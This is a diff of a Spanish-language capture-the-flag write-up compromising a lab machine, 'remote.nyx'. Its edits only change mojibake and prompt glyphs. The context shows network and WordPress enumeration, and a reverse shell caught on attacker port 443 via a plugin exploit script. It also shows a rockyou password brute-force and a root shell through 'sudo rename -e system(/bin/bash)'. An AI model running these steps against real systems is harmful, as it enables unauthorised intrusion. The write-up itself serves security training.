@@ -12,7 +12,7 @@ Fecha: 2026-02-23
 Empezaremos con un reconocimiento de red para ver la IP de este laboratorio.
 
 ```bash
-¯é░ sudo arp-scan -I eth0 --localnet
+é sudo arp-scan -I eth0 --localnet
 Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
 WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
@@ -28,11 +28,11 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 1.963 seconds (130.41 hosts/sec). 3
 Como podemos observar la IP es ***10.0.11.12*** as├¡ que empezaremos con el reconocimiento de puertos y servicios.
 
 ```bash
-¯é░ settarget 10.0.11.12            
+é settarget 10.0.11.12            
 TARGET establecido: 10.0.11.12
 
-¯é░ gomap -s $TARGET
-­ƒÄ» Scanning 10.0.11.12 (997 ports)
+é gomap -s $TARGET
+­ Scanning 10.0.11.12 (997 ports)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 8.4p1 Debian-5+deb11u1
@@ -53,7 +53,7 @@ Vamos a ver que tenemos en la web de este laboratorio.
 Nos encontramos con la pagina por defecto de Apache, as├¡ que tendremos que realizar una enumeraci├│n de directorios a ver que encontramos.
 
 ```bash
-¯é░ dirb http://$TARGET
+é dirb http://$TARGET
 
 -----------------
 DIRB v2.22    
@@ -83,7 +83,7 @@ Bueno, parece que estamos frente a un *Wodpress* as├¡ que vamos a mirar la we
 Curiosamente solo nos aparece texto de mala manera, esto indica que estamos frente a un dominio, al pasar el rat├│n por encima de *┬íHello World!* vemos que el dominio es **remote.nyx**. ahora tendremos que a├▒adirlo a nuestro */etc/hosts*.
 
 ```bash
-¯é░ sudo nano /etc/hosts
+é sudo nano /etc/hosts
 
 127.0.0.1       localhost
 127.0.1.1       jd-sec.intracof.local   jd-sec
@@ -99,7 +99,7 @@ ff02::2 ip6-allrouters
 Ahora podemos ver la web en condiciones pero solo encontramos un usuario **tiago** por ende trataremos de realizar una enumeraci├│n de este CMS para buscar vectores de ataque.
 
 ```bash
-¯é░ wpscan --url http://remote.nyx/wordpress/ -e u,p --plugins-detection aggressive
+é wpscan --url http://remote.nyx/wordpress/ -e u,p --plugins-detection aggressive
 
 _______________________________________________________________
          __          _______   _____
@@ -241,15 +241,15 @@ if __name__ == "__main__":
 Primero tendremos que tener a la escucha nuestro equipo.
 
 ```bash
-¯é░ penelope -p 443                 
+é penelope -p 443                 
 [+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.11 ÔÇó 172.17.0.1
-Ô×ñ  ­ƒÅá Main Menu (m) ­ƒÆÇ Payloads (p) ­ƒöä Clear (Ctrl-L) ­ƒÜ½ Quit (q/Ctrl-C)
+Ô×ñ  ­Åá Main Menu (m) ­ÆÇ Payloads (p) ­ö Clear (Ctrl-L) ­Ü½ Quit (q/Ctrl-C)
 ```
 
 Una vez a la escucha ejecutamos el exploit para tener acceso a la maquina victima.
 
 ```bash
-¯é░ python3 exploit.py http://remote.nyx/wordpress 10.0.11.11 443 8000
+é python3 exploit.py http://remote.nyx/wordpress 10.0.11.11 443 8000
 ```
 
 Este exploit solicita la direcci├│n donde se encuentra *Wordpress*, despu├®s la *ip de atacante*, el *puerto de atacante* y por ultimo el *puerto donde se servir├í el payload*.
@@ -289,7 +289,7 @@ www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/ca
 Estos fichero no tienen un uso relevante para la escalada de privilegios, pero *ssh-keysign* puede ser interesante, probemos otras v├¡as antes.
 
 ```bash
-¯é░ wpscan --url http://remote.nyx/wordpress/ -U tiago -P /usr/share/wordlists/rockyou.txt
+é wpscan --url http://remote.nyx/wordpress/ -U tiago -P /usr/share/wordlists/rockyou.txt
 ```
 
 El ataque de diccionario no ha tenido el efecto deseado y por consiguiente continuamos con otra tarea.
@@ -348,3 +348,4 @@ sudo rename -e 'system("/bin/bash")' test.txt
 ```
 
 Con esto ya tenemos comprometida la maquina.
+
